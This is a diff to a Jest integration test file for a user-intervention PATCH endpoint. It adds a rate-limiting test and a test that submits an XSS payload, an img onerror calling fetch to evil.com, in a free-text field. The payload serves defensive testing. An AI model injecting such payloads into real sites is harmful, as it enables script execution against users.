@@ -25,12 +25,13 @@ jest.mock('../../../Back/src/infrastructure/auth/permissions.middleware', () =>
 );
  
 // --- Rate limiter with controllable FLAG ---
-// Passes through by default; activated for case 3.4.
-let mockRateLimitBehavior = 'allow';
- 
+let mockRateLimitActive = false;
+
+
+
 jest.mock('../../../Back/src/infrastructure/external/rateLimiting', () =>
   () => (req, res, next) => {
-    if (mockRateLimitBehavior === 'limit') {
+    if (mockRateLimitActive) {
       return res.status(429).json({ message: 'Too many requests' });
     }
     next();
@@ -56,8 +57,8 @@ afterAll(async () => {
  
 const asAuthenticated   = () => { mockAuthBehavior = 'authenticated'; };
 const asUnauthenticated = () => { mockAuthBehavior = 'unauthenticated'; };
-const enableRateLimit   = () => { mockRateLimitBehavior = 'limit'; };
-const disableRateLimit  = () => { mockRateLimitBehavior = 'allow'; };
+const enableRateLimit  = () => { mockRateLimitActive = true; };
+const disableRateLimit = () => { mockRateLimitActive = false; };
  
 /** Valid base payload used across all tests. */
 const validBody = () => ({
@@ -140,5 +141,36 @@ describe('INTEGRATION — PATCH /users/:id_user/intervention · contract_link (c
     expect(res.text).not.toContain('stack');
 
   });
+
+   
+   // 3.4 — Rate limiting blocks request flooding.
+  test('3.4 responds 429 when the rate limiter detects request flooding', async () => {
+    enableRateLimit();
+ 
+    const res = await request(app)
+      .patch('/users/1/intervention')
+      .send(validBody());
+ 
+    expect(res.status).toBe(429);
+    expect(res.body).toHaveProperty('message', 'Too many requests');
+    expect(mockExecuteUpdate).not.toHaveBeenCalled();
+  });
+
+
+ 
+  // 3.5 — XSS in free-text field passes through as a plain string (200).
+  // Neutralisation happens at render time via EJS escaping.
+  test('3.5 accepts an XSS payload in neuro_profile as plain string', async () => {
+    mockExecuteUpdate.mockResolvedValue({ success: true });
+ 
+    const res = await request(app)
+      .patch('/users/1/intervention')
+      .send({ ...validBody(), neuro_profile: '<img src=x onerror="fetch(\'https://evil.com\')">' });
+ 
+    expect(res.status).toBe(200);
+    expect(res.text).not.toContain('stack');
+  });
+
+
 
   });
